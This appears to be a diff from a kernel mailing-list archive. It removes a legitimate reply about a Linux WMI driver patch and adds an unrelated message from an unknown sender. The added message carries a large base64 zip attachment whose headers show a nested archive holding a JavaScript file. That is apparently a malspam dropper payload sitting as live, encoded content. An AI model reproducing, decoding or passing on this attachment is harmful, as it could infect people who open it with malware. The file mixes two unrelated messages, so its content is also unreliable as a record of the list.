@@ -1,100 +1,108 @@
-From: Pali =?utf-8?q?Roh=C3=A1r?= <pali.rohar@gmail.com>
-Subject: Re: [PATCH] RFC: platform/x86: wmi: Fix check for method instance number
-Date: Sat, 10 Jun 2017 21:15:57 +0200
-Message-ID: <201706102115.57995@pali>
-References: <1495886134-8276-1-git-send-email-pali.rohar@gmail.com>
+From: <mbalhoff@fulbright.com>
+Subject: (unknown)
+Date: Sat, 10 Jun 2017 21:10:25 -0000
+Message-ID: <149712902507.19457.3426568904919799453@17.237.104.185.dynamic.electronicamartinez.es>
 Mime-Version: 1.0
-Content-Type: multipart/signed;
-  boundary="nextPart3297869.eVptn7DLR1";
-  protocol="application/pgp-signature";
-  micalg=pgp-sha1
-Content-Transfer-Encoding: 7bit
+Content-Type: application/zip; name="436049145.zip"
+Content-Transfer-Encoding: base64
 Return-path: <platform-driver-x86-owner@vger.kernel.org>
-Received: from mail-wr0-f196.google.com ([209.85.128.196]:36333 "EHLO
-        mail-wr0-f196.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1751555AbdFJTQA (ORCPT
+Received: from 17.237.104.185.dynamic.electronicamartinez.es ([185.104.237.17]:57543
+        "HELO 17.237.104.185.dynamic.electronicamartinez.es"
+        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with SMTP
+        id S1751671AbdFJVK2 (ORCPT
         <rfc822;platform-driver-x86@vger.kernel.org>);
-        Sat, 10 Jun 2017 15:16:00 -0400
-In-Reply-To: <1495886134-8276-1-git-send-email-pali.rohar@gmail.com>
+        Sat, 10 Jun 2017 17:10:28 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: platform-driver-x86-owner@vger.kernel.org
 List-ID: <platform-driver-x86.vger.kernel.org>
-To: Darren Hart <dvhart@infradead.org>
-Cc: Andy Shevchenko <andy@infradead.org>, Andy Lutomirski <luto@kernel.org>, platform-driver-x86@vger.kernel.org, linux-kernel@vger.kernel.org
+To: platform-driver-x86@vger.kernel.org
 
---nextPart3297869.eVptn7DLR1
-Content-Type: Text/Plain;
-  charset="utf-8"
-Content-Transfer-Encoding: quoted-printable
-
-On Saturday 27 May 2017 13:55:34 Pali Roh=C3=A1r wrote:
-> instance_count defines number of instances of data block and instance
-> itself is indexed from zero, which means first instance has number 0.
-> Therefore check for invalid instance should be non-strict inequality.
->=20
-> Signed-off-by: Pali Roh=C3=A1r <pali.rohar@gmail.com>
-> ---
-> I'm marking this patch as RFC because it is not tested at all and
-> probably could break existing WMI drivers. Some WMI drivers pass
-> instance number 1 and I'm not sure if ACPI-WMI bytecode for those
-> machines has really two instances. In more cases ACPI-WMI bytecode
-> does not check instance number if supports only one instance. So
-> then any instance id can be used for correct execution of ACPI-WMI
-> method.
->=20
-> So this patch is open for discussion.
-
-Hi! Any comments?
-
-> ---
->  drivers/platform/x86/wmi.c |    6 +++---
->  1 file changed, 3 insertions(+), 3 deletions(-)
->=20
-> diff --git a/drivers/platform/x86/wmi.c b/drivers/platform/x86/wmi.c
-> index cd7045f..df63037 100644
-> --- a/drivers/platform/x86/wmi.c
-> +++ b/drivers/platform/x86/wmi.c
-> @@ -191,7 +191,7 @@ acpi_status wmi_evaluate_method(const char
-> *guid_string, u8 instance, if (!(block->flags & ACPI_WMI_METHOD))
->  		return AE_BAD_DATA;
->=20
-> -	if (block->instance_count < instance)
-> +	if (block->instance_count <=3D instance)
->  		return AE_BAD_PARAMETER;
->=20
->  	input.count =3D 2;
-> @@ -250,7 +250,7 @@ struct acpi_buffer *out)
->  	block =3D &wblock->gblock;
->  	handle =3D wblock->handle;
->=20
-> -	if (block->instance_count < instance)
-> +	if (block->instance_count <=3D instance)
->  		return AE_BAD_PARAMETER;
->=20
->  	/* Check GUID is a data block */
-> @@ -323,7 +323,7 @@ acpi_status wmi_set_block(const char
-> *guid_string, u8 instance, block =3D &wblock->gblock;
->  	handle =3D wblock->handle;
->=20
-> -	if (block->instance_count < instance)
-> +	if (block->instance_count <=3D instance)
->  		return AE_BAD_PARAMETER;
->=20
->  	/* Check GUID is a data block */
-
-=2D-=20
-Pali Roh=C3=A1r
-pali.rohar@gmail.com
-
---nextPart3297869.eVptn7DLR1
-Content-Type: application/pgp-signature; name=signature.asc 
-Content-Description: This is a digitally signed message part.
-
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.11 (GNU/Linux)
-
-iEYEABECAAYFAlk8RW0ACgkQi/DJPQPkQ1K8WACgywv3Iwy1Sxf4hVF8pDbUU79A
-y4MAn1yeDyyWkQe5Ievvx1aMN8nLnw+9
-=kF1h
------END PGP SIGNATURE-----
-
---nextPart3297869.eVptn7DLR1--
+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
+AA==
